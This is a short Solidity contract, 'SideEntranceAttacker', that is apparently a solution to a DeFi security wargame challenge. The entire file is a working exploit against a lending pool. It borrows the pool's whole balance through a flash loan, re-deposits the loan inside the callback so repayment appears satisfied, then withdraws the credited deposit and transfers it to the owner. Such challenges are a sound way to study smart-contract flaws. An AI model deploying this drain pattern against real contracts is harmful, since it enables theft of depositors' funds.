// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Pool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract SideEntranceAttacker {
    Pool public pool;
    address public owner;

    constructor (address _pool) {
        require(_pool != address(0), "invalid pool address");
        pool = Pool(_pool);
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external {
        require(msg.sender == owner, "not owner");
        
        uint256 amount = address(pool).balance;
        pool.flashLoan(amount);
        pool.withdraw();
        payable(owner).transfer(amount);
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }
}
